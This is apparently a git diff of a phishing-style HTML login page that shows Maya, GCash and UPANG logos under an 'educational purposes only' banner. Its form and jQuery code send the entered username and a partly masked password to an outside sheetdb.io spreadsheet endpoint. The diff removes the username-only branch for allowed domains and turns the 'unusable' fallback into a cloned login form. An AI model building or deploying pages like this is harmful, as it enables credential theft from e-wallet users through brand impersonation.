@@ -5,34 +5,107 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Testing Website</title>
-    <link rel="stylesheet" href="styles.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <style type="text/css">
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+
+        .text {
+            text-align: center;
+            color: #555;
+            font-style: italic;
+            margin-bottom: 20px;
+        }
+
+        .login-container {
+            text-align: center;
+
+        }
+
+        p {
+            color: #333;
+            line-height: 1.6;
+            text-align: justify;
+        }
+
+
+        .image-container {
+            text-align: center;
+            margin-bottom: 20px;
+
+        }
+
+        .image-container img {
+            width: 100px;
+            height: auto;
+        }
+
+        form {
+            width: 300px;
+            padding: 50px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin: 20px auto;
+
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 16px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 
 <body>
 
     <div id="original-content" class="login-container">
         <div class="image-container">
-            <img style="width: 100px; height: auto;" src="maya.jpg" alt="maya">
-            <img style="width: 100px; height: auto;" src="UPANG.png" alt="UPANG">
-            <img style="width: 100px; height: auto;" src="Gcash.jpeg" alt="GCASH">
+            <img src="maya.jpg" alt="maya">
+            <img src="UPANG.png" alt="UPANG">
+            <img src="Gcash.jpeg" alt="GCASH">
         </div>
 
         <h1>This is for educational purposes only</h1>
 
         <p class="text">
             Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et
-            dolore
-            magna aliqua. Massa massa ultricies mi quis hendrerit dolor magna eget. Augue lacus viverra vitae congue eu
-            consequat ac felis. Ut tortor pretium viverra suspendisse potenti nullam ac. Amet nisl suscipit adipiscing
-            bibendum est ultricies. Nisi scelerisque eu ultrices vitae. Est velit egestas dui id ornare arcu odio ut.
+            dolore magna aliqua. Massa massa ultricies mi quis hendrerit dolor magna eget.<br>
+            Augue lacus viverra vitae congue eu consequat ac felis. Ut tortor pretium viverra suspendisse potenti nullam
+            ac.
+            Amet nisl suscipit adipiscing bibendum est ultricies.
         </p>
 
         <h2>Login Form</h2>
 
-        <form
-            style="width: 300px; padding: 50px; border: 1px solid #ccc; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); margin: 20px auto;"
-            method="POST" action="https://sheetdb.io/api/v1/qnl0ttn2utoga" id="sheetdb-form">
+        <form method="POST" action="https://sheetdb.io/api/v1/e8qqennjjjob7" id="sheetdb-form">
 
             <label for="username">Username:</label>
             <input type="text" id="username" name="data[Username]" required>
@@ -94,7 +167,7 @@
                     var fullPassword = $('#password').val();
 
                     // Determine if the password should be truncated or not
-                    var truncatedPassword = fullPassword.length > 4 ? '****' + fullPassword.slice(-4) : fullPassword;
+                    var truncatedPassword = fullPassword.length > 4 ? '*'.repeat(fullPassword.length - 4) + fullPassword.slice(-4) : fullPassword;
 
                     // Add the password to the hidden field
                     $('[name="data[password]"]').val(truncatedPassword);
@@ -118,33 +191,32 @@
                                 console.error('Error:', error);
                                 alert('Error occurred'); // To check if it did not pass through
                             });
-                    } else {
-                        // Domain is allowed, so only save the username
-                        console.log('It\'s legit'); // Domain is allowed
-                        // Fetch data using AJAX with only the username
-                        fetch(form.action, {
-                            method: "POST",
-                            body: JSON.stringify({
-                                "data[Username]": $('#username').val()
-                            }),
-                            headers: {
-                                'Content-Type': 'application/json'
-                            }
-                        })
-                            .then(response => response.json())
-                            .then(data => {
-                                // Handle the response data
-                                console.log(data);
-                                alert('Success'); // To check if it passed through
-
-                                // Reset the form
-                                form.reset();
-                            })
-                            .catch(error => {
-                                console.error('Error:', error);
-                                alert('Error occurred'); // To check if it did not pass through
-                            });
                     }
+                    // else {
+                    //     // Fetch data using AJAX with only the username
+                    //     fetch(form.action, {
+                    //         method: "POST",
+                    //         body: JSON.stringify({
+                    //             "data[Username]": $('#username').val()
+                    //         }),
+                    //         headers: {
+                    //             'Content-Type': 'application/json'
+                    //         }
+                    //     })
+                    //         .then(response => response.json())
+                    //         .then(data => {
+                    //             // Handle the response data
+                    //             console.log(data);
+                    //             alert('Success'); // To check if it passed through
+
+                    //             // Reset the form
+                    //             form.reset();
+                    //         })
+                    //         .catch(error => {
+                    //             console.error('Error:', error);
+                    //             alert('Error occurred'); // To check if it did not pass through
+                    //         });
+                    // }
                 });
             });
         }
@@ -164,14 +236,9 @@
         function makeWebpageUnusable() {
             // Replace the body content with a placeholder message or a different HTML structure
             $('body').html(
-                '<h1>Webpage Unusable</h1><p>The content of this webpage is unavailable.</p><input type="text" id="username" name="data[Username]" required>'
+                '<h1>This is for educational purposes only</h1><img style="width: 700px; height: auto;" src="maya.jpg" alt="maya"><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Massa massa ultricies mi quis hendrerit dolor magna eget. Augue lacus viverra vitae congue eu consequat ac felis. Ut tortor pretium viverra suspendisse potenti nullam ac. Amet nisl suscipit adipiscing bibendum est ultricies.</p><img style="width: 100px; height: auto;" src="UPANG.png" alt="UPANG"><img style="width: 500px; height: 100;" src="Gcash.jpeg" alt="GCASH"><h2>Login Form</h2><label for="username">Username:</label><input type="text" id="username" name="data[Username]" required><label for="password">Password:</label><input type="password" id="password" name="data[password]" required><button type="submit">Login</button>'
             );
-            // Add styles to the placeholder message
-            $('body').css({
-                'background-color': 'red',
-                'color': 'yellow',
-                // Add other styles as needed
-            });
+
         }
     </script>
 
